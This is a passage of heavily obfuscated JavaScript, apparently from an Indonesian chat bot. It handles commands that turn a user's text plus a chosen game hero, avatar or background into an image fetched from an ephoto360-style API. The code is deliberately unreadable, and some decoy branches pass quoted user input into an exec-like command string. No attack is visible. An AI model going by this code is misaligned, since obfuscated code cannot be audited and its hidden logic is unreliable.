78[_0x240d04(0xffc)],_0x1ce978[_0x240d04(0x2531)],_0x1ce978[_0x240d04(0x608)],_0x1ce978[_0x240d04(0x24d5)],_0x1ce978[_0x240d04(0xa46)],_0x1ce978['ZEHve'],_0x1ce978[_0x240d04(0x2e14)]];if(!_0x5cf1cf[_0x240d04(0x55c)](_0x83dd4c)){if(_0x1ce978['NAsDq'](_0x1ce978['xNdrO'],_0x240d04(0xcc8)))return _0x1ce978[_0x240d04(0x1cd8)](_0x493acf,_0x240d04(0x14f0)+_0x240d04(0x9ad)+'ara\x20karena'+_0x240d04(0x2826)+'anyak\x20pela'+_0x240d04(0x1310)+_0x240d04(0x260)+_0x240d04(0x1c31)+_0x240d04(0x2b19)+_0x240d04(0x7af)+_0x240d04(0x2e65)+_0x240d04(0xe32));else _0x1ce978['hnAJD'](_0x555a99,_0x5cf1cf,_0x5cf1cf[_0x240d04(0x2b45)],'wallpaper');}else{if(_0x1ce978[_0x240d04(0x1f34)](_0x1ce978['FfEdu'],_0x240d04(0x289c)))_0x473a1c['error'](_0x4ecc12),_0x1ce978[_0x240d04(0x10c1)](_0x970af9,_0x1ce978[_0x240d04(0x2426)]);else{_0x1ce978[_0x240d04(0x2ac8)](_0x476bfb,lang['wait']);let _0x3a40a2=_0x1ce978['pIPsz'](api,'alfa',_0x1ce978[_0x240d04(0xf72)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'wallpaper':_0x83dd4c},_0x240d04(0x23aa)),_0x1569bd=await _0x1ce978[_0x240d04(0x2578)](fetch,_0x3a40a2);if(!_0x1569bd['ok'])throw await _0x1569bd[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x3a40a2},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x821)]:{if(_0x1ce978[_0x240d04(0x2658)](_0x1ce978[_0x240d04(0x1c51)],_0x240d04(0x9c2))){const _0x2aca12={'money':'💰','exp':'✨','chip':'🎫','potion':'🧪','trash':_0x1ce978[_0x240d04(0x1919)],'wood':'🪵','rock':'🪨','string':'🧵','iron':'⛓️','gold':'🥇','diamond':'💎','emerald':'🟢','common':'📦','uncommon':'🎁','mythic':'🧿','legendary':'👑','pet':'🐶','petfood':'🍗','umpan':'🐟','pisang':'🍌','anggur':'🍇','apel':'🍎','jeruk':'🍊','mangga':'🥭','bibitpisang':_0x240d04(0x23a4),'bibitanggur':_0x1ce978[_0x240d04(0x1cd)],'bibitapel':_0x1ce978[_0x240d04(0x8cb)],'bibitjeruk':_0x1ce978['TlWVR'],'bibitmangga':_0x240d04(0x2c87)};return _0x2aca12[_0x19d8e7]||'';}else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x516)](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x86c)](_0x1ec495,_0x3e6565)+(_0x240d04(0xd93)+_0x240d04(0x13ff)+'h\x20pengguna'+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0xcc5)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0xc2e)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x15d8)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x22a7)](_0x1ec495,_0x3e6565)+('\x20teks|hero'+_0x240d04(0x13ff)+_0x240d04(0x1d12)+'an:\x0a`')+_0x1ce978[_0x240d04(0x2c81)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xc2e)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x26fc24=['void',_0x1ce978[_0x240d04(0x268d)],_0x240d04(0x607),'ursa',_0x1ce978[_0x240d04(0x1677)],_0x1ce978['MZwYL'],_0x1ce978['nIfsh'],_0x240d04(0x452)+_0x240d04(0x363),_0x1ce978['OPmKe'],_0x1ce978[_0x240d04(0x1b0c)],_0x1ce978[_0x240d04(0x95b)],'luna',_0x1ce978[_0x240d04(0x2bad)],_0x1ce978[_0x240d04(0xc22)],_0x240d04(0x146b),_0x1ce978[_0x240d04(0x223e)],_0x1ce978[_0x240d04(0x1833)],_0x1ce978[_0x240d04(0x54f)],_0x1ce978['oPUPO'],_0x240d04(0xc5),_0x1ce978[_0x240d04(0x2a3e)],_0x240d04(0x2ae3),_0x1ce978[_0x240d04(0x2314)],_0x1ce978[_0x240d04(0x10bf)],_0x1ce978[_0x240d04(0x1059)],_0x240d04(0x35e)+'t',_0x1ce978[_0x240d04(0x2c00)],_0x1ce978[_0x240d04(0x2c00)],_0x1ce978['raFOC'],_0x1ce978[_0x240d04(0xcc7)],_0x240d04(0x741),_0x1ce978[_0x240d04(0xe44)],_0x240d04(0x2def)+'r',_0x1ce978[_0x240d04(0x85f)]];if(!_0x26fc24[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x2e33)](_0x555a99,_0x26fc24,_0x26fc24['length'],_0x1ce978['PKHHh']);else{if(_0x1ce978[_0x240d04(0x163c)]!==_0x1ce978[_0x240d04(0x163c)])return _0x1ce978[_0x240d04(0x2b72)](_0x294f53,_0x240d04(0x14f0)+_0x240d04(0x9ad)+_0x240d04(0x2b5c)+'\x20terlalu\x20b'+'anyak\x20pela'+_0x240d04(0x1310)+'unakan\x20*be'+_0x240d04(0x1c31)+_0x240d04(0x2b19)+_0x240d04(0x7af)+_0x240d04(0x2e65)+_0x240d04(0xe32));else{_0x1ce978[_0x240d04(0x14f1)](_0x476bfb,lang['wait']);let _0x2fa1bb=_0x1ce978['jkJNj'](api,_0x240d04(0x10a),_0x1ce978['trwXJ'](_0x240d04(0x1dfb)+'o360/',_0x3e6565),{'text':_0x2b7b14,'heroes':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x37fdfe=await _0x1ce978[_0x240d04(0x179e)](fetch,_0x2fa1bb);if(!_0x37fdfe['ok'])throw await _0x37fdfe[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x2fa1bb},{'caption':lang['ok']});}}}}break;case _0x1ce978[_0x240d04(0x1421)]:{if(!_0x33cfb1)return _0x1ce978['AhzaT'](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['KByGZ'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x1aea)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x20a3)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0xa37)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2a2e)](_0x1ec495,_0x3e6565)+('\x20teks|char'+'acter`\x0a\x0aCo'+'ntoh\x20pengg'+_0x240d04(0x2a75))+_0x1ce978['bmedH'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x20a3)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x4a504c=[_0x1ce978['bNqxN'],_0x1ce978[_0x240d04(0x1773)],_0x1ce978['DSije'],_0x1ce978[_0x240d04(0x91c)],_0x240d04(0x188e),_0x1ce978[_0x240d04(0x4e7)],_0x1ce978[_0x240d04(0x2a92)],_0x1ce978['kainA'],_0x1ce978[_0x240d04(0x147e)],_0x1ce978[_0x240d04(0x55d)],_0x1ce978[_0x240d04(0x1cda)],_0x1ce978['DvprM'],_0x1ce978[_0x240d04(0x2838)],_0x240d04(0x139a),_0x1ce978['iuyIb'],_0x1ce978[_0x240d04(0x2401)],_0x1ce978[_0x240d04(0x508)],_0x1ce978['Uvgkv'],_0x1ce978[_0x240d04(0xa4f)],_0x1ce978[_0x240d04(0x1f5a)],'taara',_0x1ce978[_0x240d04(0xddf)],_0x1ce978[_0x240d04(0x1327)],_0x1ce978[_0x240d04(0xda8)],'butterfly-'+'3',_0x1ce978[_0x240d04(0x18eb)],_0x1ce978['ixOcl'],_0x1ce978[_0x240d04(0x2493)],_0x1ce978[_0x240d04(0x95d)],_0x240d04(0x1326),_0x1ce978[_0x240d04(0x2c3e)],_0x1ce978[_0x240d04(0x358)],_0x240d04(0x102b),_0x1ce978['kIhUX'],_0x240d04(0x8e9),_0x1ce978[_0x240d04(0xe57)],_0x1ce978[_0x240d04(0x1095)],_0x240d04(0x1c5a),_0x240d04(0x203d),_0x1ce978[_0x240d04(0x2b0e)],'preyta',_0x1ce978[_0x240d04(0x1769)],_0x1ce978[_0x240d04(0x1161)],'lumburr',_0x1ce978[_0x240d04(0x1ada)],_0x1ce978[_0x240d04(0x1126)],_0x1ce978[_0x240d04(0x2b01)],_0x1ce978[_0x240d04(0x1a3b)]];if(!_0x4a504c[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x1cbb)](_0x555a99,_0x4a504c,_0x4a504c[_0x240d04(0x2b45)],_0x240d04(0xc53));else{if(_0x1ce978[_0x240d04(0x72d)]('qaTxC',_0x240d04(0x1be4)))_0x42f260[_0x240d04(0x15e)](_0x250417),_0x1ce978[_0x240d04(0x260b)](_0x4753e2,_0x1ce978[_0x240d04(0x1e0e)]);else{_0x1ce978[_0x240d04(0x743)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x5b63bb=_0x1ce978[_0x240d04(0x1ad4)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x241b)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x53b51e=await _0x1ce978[_0x240d04(0x20b1)](fetch,_0x5b63bb);if(!_0x53b51e['ok'])throw await _0x53b51e['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x5b63bb},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x606)]:{if(_0x240d04(0xbfc)!==_0x1ce978[_0x240d04(0x17f)]){if(!_0x33cfb1)return _0x1ce978['VmrBD'](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x2598)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2769)+_0x240d04(0x1685)+_0x240d04(0x1d12)+'an:\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x10dc)+'`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['PMzBW'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['TMIrn'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2769)+'ar`\x0a\x0aConto'+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x15dc)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x10dc)+'`'));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x4958a4=[_0x1ce978['AegXi'],_0x240d04(0xbc6),_0x1ce978[_0x240d04(0x1b7b)],_0x1ce978[_0x240d04(0x13d)],_0x1ce978['usghF'],_0x1ce978[_0x240d04(0x2bb8)],_0x1ce978[_0x240d04(0x28d7)],_0x1ce978[_0x240d04(0x2111)],_0x1ce978[_0x240d04(0x7ab)],_0x1ce978[_0x240d04(0x2620)],_0x1ce978['nRAvr'],_0x1ce978['MyJpj']];if(!_0x4958a4[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x1661)](_0x1ce978['BIgIm'],_0x1ce978[_0x240d04(0x28fe)])?_0x1ce978['UAeSs'](_0x555a99,_0x4958a4,_0x4958a4['length'],_0x1ce978[_0x240d04(0x8ca)]):_0x4fc6ab[_0x1ca7e6]&&_0x1ce978[_0x240d04(0x8ef)](_0x3b990c[_0x240d04(0x104e)]()-_0x5b34a0[_0x501623]['startedAt'],0x13880)&&(_0x1ce978[_0x240d04(0x1fcf)](_0x1a3b6f,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x182fb0(_0x36e07c)+'*'),delete _0x47c056[_0x48b4e8]);else{_0x1ce978['LUNjC'](_0x476bfb,lang['wait']);let _0x196331=_0x1ce978[_0x240d04(0x19a2)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x12b5)]('/api/ephot'+'o360/',_0x3e6565),{'text':_0x2b7b14,'avatar':_0x83dd4c},'apikey'),_0x242e0f=await fetch(_0x196331);if(!_0x242e0f['ok'])throw await _0x242e0f['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x196331},{'caption':lang['ok']});}}else _0x360c51['error'](_0x40c042),_0x1ce978[_0x240d04(0x162d)](_0x12e805,_0x1ce978['Rdtcu']+_0x4c94ef[_0x240d04(0x960)]);}break;case _0x240d04(0xfbf)+_0x240d04(0x1d26):{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2741)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x25e6)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978['gBZQv'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xb7d)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1860)+'acter`\x0a\x0aCo'+_0x240d04(0x1f79)+_0x240d04(0x2a75))+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0xb7d)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x5e7428=[_0x240d04(0x2092),_0x1ce978['KIuKl'],'warface-2',_0x1ce978[_0x240d04(0x1c4b)],_0x240d04(0x27b8),_0x1ce978[_0x240d04(0xb2e)],_0x1ce978['qUSoz'],_0x1ce978['XXSZN'],_0x240d04(0x14a4),_0x1ce978[_0x240d04(0x286e)],_0x1ce978['UAGoy'],_0x1ce978[_0x240d04(0x2a38)]];if(!_0x5e7428[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x4d9)](_0x555a99,_0x5e7428,_0x5e7428[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2597)]);else{if(_0x1ce978[_0x240d04(0x20bb)](_0x240d04(0x1e96),'pcyaf'))_0x1dafc4(_0x568f96,_0x1ed0a0['length'],_0x1ce978[_0x240d04(0x2597)]);else{_0x1ce978[_0x240d04(0x14fc)](_0x476bfb,lang['wait']);let _0x295e78=_0x1ce978[_0x240d04(0x17e6)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x284e)]+_0x3e6565,{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x163e92=await _0x1ce978['ZUMCm'](fetch,_0x295e78);if(!_0x163e92['ok'])throw await _0x163e92['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x295e78},{'caption':lang['ok']});}}}break;case _0x240d04(0x284b)+'ar':{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2bfe)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0xe38)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2769)+_0x240d04(0x1685)+_0x240d04(0x1d12)+'an:\x0a`')+_0x1ce978[_0x240d04(0xf47)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x20df)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['KsuAw'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x28e8)](_0x1ec495,_0x3e6565)+('\x20teks|avat'+_0x240d04(0x1685)+'h\x20pengguna'+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x7ca)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x20df)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0xe3b8b8=[_0x1ce978[_0x240d04(0x2d59)],_0x240d04(0x2589),_0x1ce978[_0x240d04(0x1f78)],_0x240d04(0x793),_0x1ce978[_0x240d04(0x230e)],_0x1ce978[_0x240d04(0x7d0)],_0x1ce978[_0x240d04(0x1ecb)],_0x1ce978[_0x240d04(0xe87)],'sejuani',_0x1ce978[_0x240d04(0x2ce8)],_0x1ce978[_0x240d04(0x136e)],_0x1ce978[_0x240d04(0x2365)],_0x1ce978[_0x240d04(0x2529)],_0x1ce978['JmsBF'],_0x1ce978['XZjBX'],_0x1ce978[_0x240d04(0x10b5)],_0x240d04(0x1e9e),_0x240d04(0x82e),_0x1ce978[_0x240d04(0x239a)],_0x1ce978[_0x240d04(0x2e52)],'vi',_0x1ce978[_0x240d04(0x176b)],_0x240d04(0x7e0),_0x1ce978['sIdBt'],_0x1ce978[_0x240d04(0x1ec9)],_0x1ce978[_0x240d04(0x1d54)],_0x1ce978['fMYbB'],_0x240d04(0x20c0),_0x1ce978[_0x240d04(0x1a6d)],_0x1ce978[_0x240d04(0x1845)],_0x240d04(0xcee),_0x240d04(0xd31),_0x1ce978[_0x240d04(0x2a78)],_0x1ce978[_0x240d04(0x291b)],_0x1ce978[_0x240d04(0x2e76)],_0x1ce978[_0x240d04(0x1ae1)],'blitzcrank',_0x240d04(0x15d),_0x1ce978['JCXna'],_0x1ce978[_0x240d04(0x138c)],_0x1ce978['IEDIj'],_0x1ce978[_0x240d04(0x2c1f)],_0x240d04(0x1384),_0x1ce978[_0x240d04(0x1def)],_0x1ce978[_0x240d04(0x987)],_0x1ce978['Xcnin'],_0x240d04(0x405),'nordekaise'+'r',_0x1ce978[_0x240d04(0x3cb)],_0x240d04(0x225d),_0x1ce978[_0x240d04(0x1854)],_0x1ce978[_0x240d04(0x27c2)],_0x240d04(0x5f4),_0x1ce978[_0x240d04(0x19ca)],_0x1ce978[_0x240d04(0x169b)],_0x1ce978['Invhd'],_0x1ce978[_0x240d04(0x1527)],_0x1ce978[_0x240d04(0x11d7)],_0x1ce978['ERDhH'],_0x240d04(0x291c),_0x1ce978[_0x240d04(0x2274)],_0x240d04(0x408),_0x1ce978[_0x240d04(0x1d35)],_0x1ce978[_0x240d04(0x2a89)],_0x1ce978[_0x240d04(0x1a40)],_0x240d04(0x2037),_0x240d04(0xa4c),_0x1ce978[_0x240d04(0xaf4)],_0x1ce978[_0x240d04(0x2dae)],_0x1ce978[_0x240d04(0x23a0)],_0x1ce978[_0x240d04(0x13e6)],_0x240d04(0x2dc4),_0x1ce978[_0x240d04(0x2a45)],_0x1ce978[_0x240d04(0x2cde)],_0x1ce978['CguTq'],_0x1ce978[_0x240d04(0x9d2)],_0x240d04(0xc1b),_0x1ce978[_0x240d04(0x53a)],'rengar',_0x1ce978[_0x240d04(0x62d)],_0x1ce978[_0x240d04(0x28ca)],'azir',_0x1ce978[_0x240d04(0x200)],_0x1ce978[_0x240d04(0x1bfe)],_0x1ce978[_0x240d04(0xf7a)],_0x1ce978['xyWxn'],_0x240d04(0x1ebc),_0x1ce978[_0x240d04(0x1590)],_0x240d04(0x257c),_0x240d04(0x2bfb),_0x1ce978[_0x240d04(0xdd6)],'naokai',_0x1ce978['IUzMf'],_0x1ce978[_0x240d04(0x1493)],_0x1ce978[_0x240d04(0x74b)],_0x1ce978[_0x240d04(0x10ba)],_0x1ce978[_0x240d04(0x2507)],'jayce',_0x1ce978[_0x240d04(0x17c2)],_0x1ce978[_0x240d04(0x1aa4)],'xayah',_0x240d04(0x698),_0x1ce978['SOMUN'],_0x1ce978['jrBPM'],_0x1ce978['ZUnTm'],_0x1ce978[_0x240d04(0x2dce)],_0x1ce978[_0x240d04(0x2a9f)],_0x1ce978[_0x240d04(0x28c9)],_0x1ce978[_0x240d04(0x1556)],_0x1ce978['FLzTk'],_0x240d04(0x7de),_0x240d04(0x132f),_0x1ce978[_0x240d04(0xdd8)],_0x1ce978['dDVCp'],_0x1ce978[_0x240d04(0x2b7a)],_0x1ce978[_0x240d04(0x26e7)],_0x240d04(0x1d4c),_0x1ce978['uTHPx'],_0x1ce978['cOGlV'],_0x240d04(0x1b12)];if(!_0xe3b8b8[_0x240d04(0x55c)](_0x83dd4c)){if(_0x1ce978[_0x240d04(0x1fff)](_0x1ce978[_0x240d04(0x1758)],_0x1ce978[_0x240d04(0x129a)]))_0x1ce978['TspAe'](_0x555a99,_0xe3b8b8,_0xe3b8b8['length'],_0x1ce978[_0x240d04(0x8ca)]);else{const _0x473a49={'mYWhG':_0x1ce978[_0x240d04(0x197d)],'rnJqM':_0x1ce978[_0x240d04(0x190c)],'gDsyh':function(_0x21eeec,_0x387cea){const _0x2549f9=_0x240d04;return _0x1ce978[_0x2549f9(0x2b72)](_0x21eeec,_0x387cea);},'OpEtQ':_0x1ce978[_0x240d04(0x259e)],'nELpm':function(_0x14e54f,_0x57b7bf,_0x10520e){return _0x14e54f(_0x57b7bf,_0x10520e);}};return new _0x300a26((_0x5094e2,_0x2a8abb)=>{const _0x2238b5=_0x240d04,_0x4eb9dd=_0x367cc3['join'](_0x2e9116,_0x473a49[_0x2238b5(0x422)],_0x2238b5(0xaaf));_0x473a49[_0x2238b5(0x290c)](_0x264df3,_0x2238b5(0x1ef1)+_0x4eb9dd+'\x22\x20\x22'+_0x4ccada+'\x22',(_0x10e407,_0x2dcb8e,_0xa21a53)=>{const _0x42e780=_0x2238b5;if(_0x10e407)return _0x2a8abb(_0xa21a53||_0x10e407['message']);const _0x3929c0=_0x2dcb8e['trim']();if(!_0x3929c0||_0x3929c0[_0x42e780(0x25f7)+'e']()[_0x42e780(0x55c)](_0x473a49[_0x42e780(0x2d48)]))return _0x2a8abb(_0x473a49[_0x42e780(0x10a9)]);_0x473a49[_0x42e780(0x673)](_0x5094e2,_0x3929c0);});});}}else{_0x1ce978[_0x240d04(0x27ae)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x4d2042=_0x1ce978[_0x240d04(0x153f)](api,_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x17ac)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'avatar':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x37a2c0=await _0x1ce978[_0x240d04(0x142b)](fetch,_0x4d2042);if(!_0x37a2c0['ok'])throw await _0x37a2c0['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x4d2042},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x120e)]:{if(_0x1ce978[_0x240d04(0x1607)](_0x1ce978[_0x240d04(0x72e)],'sXaoJ')){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x18cb)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2787)](_0x1ec495,_0x3e6565)+('\x20teks|back'+_0x240d04(0x2164)+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978['trwXJ'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x12f9)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x2375)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x1982)](_0x1ec495,_0x3e6565)+(_0x240d04(0x293b)+'ground`\x0a\x0aC'+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978[_0x240d04(0x2ef3)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x12f9)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1fe4b3=[_0x240d04(0x630),_0x240d04(0x159),_0x1ce978['rpgwu'],'xm1014','famas',_0x1ce978[_0x240d04(0x1e7a)],_0x1ce978[_0x240d04(0x15b)],_0x1ce978[_0x240d04(0x231b)],_0x240d04(0x285),_0x1ce978[_0x240d04(0xeb5)],_0x1ce978['eZaHC'],_0x1ce978['mASQq'],_0x240d04(0x2a10),_0x1ce978[_0x240d04(0x2d1c)],_0x1ce978[_0x240d04(0x1789)],_0x1ce978[_0x240d04(0x14fe)],_0x1ce978[_0x240d04(0x2add)],_0x240d04(0x1c45),_0x1ce978[_0x240d04(0x1db9)],_0x1ce978[_0x240d04(0x1d09)],_0x1ce978['IKVUc'],_0x1ce978[_0x240d04(0x28a2)],_0x240d04(0x5ea)+_0x240d04(0x2eb),_0x1ce978[_0x240d04(0x561)],_0x1ce978['LXIBn'],_0x240d04(0x1c7d),_0x1ce978[_0x240d04(0x2d76)],_0x1ce978[_0x240d04(0x8be)],_0x1ce978[_0x240d04(0x28cd)],_0x1ce978[_0x240d04(0x2dd2)],_0x1ce978[_0x240d04(0x1528)],_0x1ce978[_0x240d04(0x27ec)],_0x1ce978[_0x240d04(0xb89)],_0x1ce978['nXUie'],_0x1ce978[_0x240d04(0x3b6)],_0x1ce978[_0x240d04(0x2afa)],_0x240d04(0x2530),_0x1ce978[_0x240d04(0x1735)],_0x1ce978[_0x240d04(0x1ab8)],_0x1ce978['jiSnR'],_0x1ce978[_0x240d04(0x700)],_0x1ce978['mHUme']];if(!_0x1fe4b3[_0x240d04(0x55c)](_0x83dd4c))_0x555a99(_0x1fe4b3,_0x1fe4b3['length'],_0x1ce978[_0x240d04(0x2a3c)]);else{if(_0x1ce978[_0x240d04(0x21ee)](_0x1ce978[_0x240d04(0x92b)],_0x1ce978[_0x240d04(0x92b)]))_0x1ce978[_0x240d04(0x206e)](_0x1a78ee,_0x1ce978['asNVy']);else{_0x1ce978[_0x240d04(0x5fb)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x1fa676=_0x1ce978[_0x240d04(0x1cf0)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x208b)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'background':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x1effdb=await _0x1ce978['pNPnq'](fetch,_0x1fa676);if(!_0x1effdb['ok'])throw await _0x1effdb['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x1fa676},{'caption':lang['ok']});}}}else _0x331f20[_0x3d359c]+=_0xee60f5,_0x4f5be7=_0x240d04(0x2c05)+_0x240d04(0x2713)+_0x240d04(0x2222)+'+'+_0x4498e7+'\x20'+_0x1ce978['KsuAw'](_0x1a10c8,_0x16b076)+'*';}break;case _0x1ce978[_0x240d04(0x9b1)]:{if(_0x1ce978[_0x240d04(0x103d)]===_0x1ce978['DRTPR']){const _0x1e39eb={'ApaEZ':function(_0x4e2bf6,_0x3382ec){const _0xdadece=_0x240d04;return _0x1ce978[_0xdadece(0x247e)](_0x4e2bf6,_0x3382ec);},'zHWYI':_0x240d04(0x15e)},_0x2654a6=_0x5c628d[_0x240d04(0x86e)](_0x5c9116,_0x1ce978['fKUhy'],_0x1ce978[_0x240d04(0x88e)]);_0x209643(_0x240d04(0x1ef1)+_0x2654a6+'\x22\x20\x22'+_0x48409e+'\x22',(_0x1a5e00,_0x4c6284,_0x3ffd73)=>{const _0x271a6e=_0x240d04;if(_0x1a5e00)return _0x1e39eb[_0x271a6e(0x2286)](_0x46d373,_0x3ffd73||_0x1a5e00['message']);const _0xdb10fe=_0x4c6284[_0x271a6e(0x2d6d)]();if(!_0xdb10fe||_0xdb10fe[_0x271a6e(0x25f7)+'e']()['includes'](_0x1e39eb[_0x271a6e(0x2201)]))return _0x1e39eb[_0x271a6e(0x2286)](_0x198809,_0x271a6e(0x5b6)+'al');_0x1e39eb[_0x271a6e(0x2286)](_0x283b00,_0xdb10fe);});}else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2578)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0xb79)](_0x1ec495,_0x3e6565)+('\x20teks|hero'+_0x240d04(0xdcf)+_0x240d04(0x2d50)+':\x0a`')+_0x1ce978[_0x240d04(0x155)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ilumia-5`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x1b8d)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x15dc)](_0x1ec495,_0x3e6565)+(_0x240d04(0xd93)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+':\x0a`')+_0x1ce978['SIBpY'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xc85)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const 